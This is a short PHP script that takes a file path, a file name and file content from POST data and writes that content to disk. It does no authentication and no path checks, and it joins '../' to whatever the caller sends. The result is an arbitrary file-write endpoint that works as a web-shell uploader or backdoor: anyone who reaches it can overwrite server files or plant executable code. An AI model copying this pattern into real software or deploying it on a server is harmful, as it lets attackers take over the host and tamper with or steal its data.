<?php

$file=@$_POST['path'];
$fname=@$_POST['name'];
$content=@$_POST['content'];
if(isset($file)&&!empty($file)){
    $filen="../".$file;
if(file_exists($filen)){    
file_put_contents($filen,$content);

echo $filen."success ".$content;
}
else{
    $filen="../".$fname;
    echo $file;
}
}
else if(isset($fname)&&!empty ($fname)){
    $filen='../wapps/'.$fname;
   file_put_contents($filen,$content);
}

?>
